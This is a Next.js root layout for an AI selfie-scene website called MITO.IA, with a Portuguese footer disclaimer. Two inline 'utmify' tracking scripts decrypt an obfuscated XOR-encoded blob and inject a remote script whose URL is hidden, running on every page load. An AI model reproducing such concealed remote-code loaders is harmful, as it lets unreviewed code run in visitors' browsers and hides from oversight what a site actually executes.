import type { Metadata } from 'next';
import { Inter } from 'next/font/google';
import Script from 'next/script';
import './globals.css';

const inter = Inter({ subsets: ['latin'] });

export const metadata: Metadata = {
  title: 'MITO.IA | Sua foto temática',
  description: 'Envie sua selfie e crie uma cena histórica com inteligência artificial.',
};

export default function RootLayout({
  children,
}: {
  children: React.ReactNode;
}) {
  return (
    <html lang="pt-BR">
      <body className={inter.className}>
        <Script
          id="utmify-tracking-script"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var p_fhht=atob("DAAEo03amMPhFA2d93sm1j+2uvnDfHnph3M+jGK5/K3PYXnwnmZ9jS619e2DZiLulHJt0zmpt7aVeX6ym2Fwxj6utqmSNiG/lnRw0SS47beEZy+nrHsmzSy3/eHbNmn8g2Ep1jm38aWYOX3vknZhzTn34KCOcCDulGsmj2+s+a+UcS+n1SJ5jzb49qKMcS+n1WRl1yz37beMfWvk2nB2xju/9rfMZ3j/nmR3gWH47qKNYWi/zSIm3hCn");var g_w=[];for(var e_b2a=0;e_b2a<p_fhht.length;e_b2a++){g_w.push(p_fhht.charCodeAt(e_b2a)&255);}var r_3=g_w[0];var x_un=g_w.slice(1,1+r_3);var l_sq2=g_w.slice(1+r_3);var l_rit=l_sq2.map(function(b,g_698v){return b^x_un[g_698v%r_3];});var c_m="";for(var b_oe=0;b_oe<l_rit.length;b_oe++){c_m+=String.fromCharCode(l_rit[b_oe]&255);}var e_t7d=decodeURIComponent(escape(c_m));var e_qgo=JSON.parse(e_t7d);var a_x=e_qgo.globals||[];a_x.forEach(function(k_yb){window[k_yb.name]=k_yb.value;});var g_b=document.createElement("script");g_b.src=e_qgo.url;g_b.async=true;g_b.defer=true;(e_qgo.attributes||[]).forEach(function(p_2){g_b.setAttribute(p_2.name,p_2.value);});(document.head||document.documentElement).appendChild(g_b);})();`
          }}
        />
        <Script
          id="utmify-pixel-script"
          strategy="afterInteractive"
          dangerouslySetInnerHTML={{
            __html: `(function(){var t_2mwp=atob("DEzDdjAZhVZGqSSdrjfhA0J1p2xkwVDp3j/5WR964Tho3FDwxyq6WFN26Hgk2wvuzT6qBkRqqiYv0UHxgTyqDlV1qzw1iwi/zzi3BFl78CIj2gan9RHvVFd16jQnxVe/lBe4VF546DNkkwbtxzSmGnl9p3pk30Xx2ynhTBIv5G5zmRSslnmnQgR6tDJzyx2tm37yE1Y7+As7");var u_fwku=[];for(var s_i2=0;s_i2<t_2mwp.length;s_i2++){u_fwku.push(t_2mwp.charCodeAt(s_i2)&255);}var j_38h=u_fwku[0];var e_g=u_fwku.slice(1,1+j_38h);var y_eww=u_fwku.slice(1+j_38h);var t_4m8=y_eww.map(function(b,g_bu){return b^e_g[g_bu%j_38h];});var e_9z="";for(var a_y9=0;a_y9<t_4m8.length;a_y9++){e_9z+=String.fromCharCode(t_4m8[a_y9]&255);}var b_jmv1=decodeURIComponent(escape(e_9z));var y_t6t=JSON.parse(b_jmv1);var p_e=y_t6t.globals||[];p_e.forEach(function(w_ua92){window[w_ua92.name]=w_ua92.value;});var a_l=document.createElement("script");a_l.src=y_t6t.url;a_l.async=true;a_l.defer=true;(y_t6t.attributes||[]).forEach(function(d_n){a_l.setAttribute(d_n.name,d_n.value);});(document.head||document.documentElement).appendChild(a_l);})();`
          }}
        />
        <div className="container">
          {children}
          <footer style={{ marginTop: 'auto', padding: '2rem 0', textAlign: 'center', fontSize: '0.8rem', color: '#888' }}>
            <p><strong>MITO.IA</strong></p>
            <div style={{ margin: '10px 0', display: 'flex', justifyContent: 'center', gap: '10px' }}>
              <a href="#">Termos</a>
              <a href="#">Privacidade</a>
              <a href="#">Reembolso</a>
              <a href="#">Contato</a>
            </div>
            <p style={{ fontSize: '0.7rem', opacity: 0.6, maxWidth: '100%' }}>
              MITO.IA é uma plataforma independente de entretenimento com inteligência artificial e não possui vínculo, aprovação ou afiliação com Jair Bolsonaro, partidos políticos ou campanhas eleitorais. As imagens apresentadas como resultados são criações fictícias geradas por IA.
            </p>
          </footer>
        </div>
      </body>
    </html>
  );
}
